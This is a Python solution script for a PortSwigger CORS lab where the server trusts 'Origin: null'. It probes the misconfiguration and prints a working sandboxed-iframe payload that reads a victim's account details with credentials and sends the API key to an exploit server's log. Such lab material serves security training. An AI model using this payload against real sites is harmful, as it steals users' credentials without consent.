# Lab 02 — CORS vulnerability with trusted null origin
# PortSwigger: https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack
#
# Vulnerability: The server explicitly whitelists Origin: null
# Aim:           Steal the administrator's API key
#
# Technique:
#   Some legitimate browser contexts (sandboxed iframes, certain redirects)
#   generate a literal "null" Origin header. The server here trusts that
#   value as if it were a known-safe origin — but an attacker can deliberately
#   produce Origin: null at will, simply by placing their exploit inside a
#   sandboxed iframe.
#
#   This script probes the misconfiguration with `requests`, then prints the
#   sandboxed-iframe exploit a real victim browser needs to actually trigger
#   and exfiltrate the credentialed cross-origin response.
#
# Usage: python cors_lab02.py <url>

import sys
import urllib3
from proxies import proxies
from cors_utils import banner, section, make_session, login, probe_origin, print_box

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

if __name__ == "__main__":
    banner()
    section("LAB 02 — CORS: TRUSTED NULL ORIGIN")

    if len(sys.argv) != 2:
        print("  Usage: python cors_lab02.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    session = make_session(proxies)

    if not login(session, url):
        sys.exit(1)

    # ── Step 1: confirm a normal arbitrary origin is NOT trusted ─────────────
    print("\n  ── Step 1: confirm an arbitrary origin is NOT reflected (baseline)\n")
    result_normal = probe_origin(session, f"{url}/accountDetails", "https://example.com")

    if result_normal["reflected"]:
        print("  ℹ  Arbitrary origins ARE reflected here too — this lab")
        print("     instance may behave like Lab 01. Continuing anyway.\n")

    # ── Step 2: probe with the literal null origin ───────────────────────────
    print("  ── Step 2: probe with Origin: null\n")
    result_null = probe_origin(session, f"{url}/accountDetails", "null")

    if not (result_null["reflected"] and result_null["credentials"]):
        print("\n  ✘  null origin reflection or credentials support not confirmed.")
        print("     Inspect the response headers manually.")
        sys.exit(1)

    print("\n  ✔  Confirmed: Origin: null is explicitly trusted, credentials allowed.")
    print("     A sandboxed iframe can generate this exact header value.\n")

    # ── Step 3: print the exploit ──────────────────────────────────────────────
    section("Step 3: Exploit HTML/JS for the exploit server")

    exploit = f"""\
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','{url}/accountDetails',true);
req.withCredentials = true;
req.send();
function reqListener() {{
    location = '/log?key=' + this.responseText;
}}
</script>"></iframe>"""

    print_box("EXPLOIT SERVER BODY", exploit)

    print("  ➜  Steps:")
    print("     1. Go to the exploit server")
    print("     2. Paste the iframe above into the Body field")
    print("     3. Click 'Store', then 'View exploit' to test on yourself")
    print("     4. Click 'Deliver exploit to victim'")
    print("     5. Check the exploit server's access log for the leaked API key")
    print()
    print("  ℹ  The 'sandbox' attribute strips the iframe's normal origin —")
    print("     that's EXACTLY why its requests carry Origin: null. We're")
    print("     using a browser security feature as the mechanism that")
    print("     satisfies the server's (incorrect) trust decision.")
